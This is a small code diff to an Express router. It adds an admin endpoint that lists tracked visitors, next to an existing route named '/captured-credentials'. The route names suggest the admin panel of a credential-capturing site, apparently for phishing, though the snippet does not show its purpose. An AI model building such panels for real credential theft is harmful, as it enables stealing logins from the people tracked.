@@ -122,4 +122,20 @@ router.get('/captured-credentials', adminAuth, (req, res) => {
   }
 });
 
+// Get tracked visitors
+router.get('/visitors', adminAuth, (req, res) => {
+  try {
+    const authRoutes = require('./auth');
+    const visitors = authRoutes.getVisitors ? authRoutes.getVisitors() : [];
+    
+    res.json({
+      count: visitors.length,
+      visitors: visitors.sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+    });
+  } catch (error) {
+    console.error('Error getting visitors:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 module.exports = router;
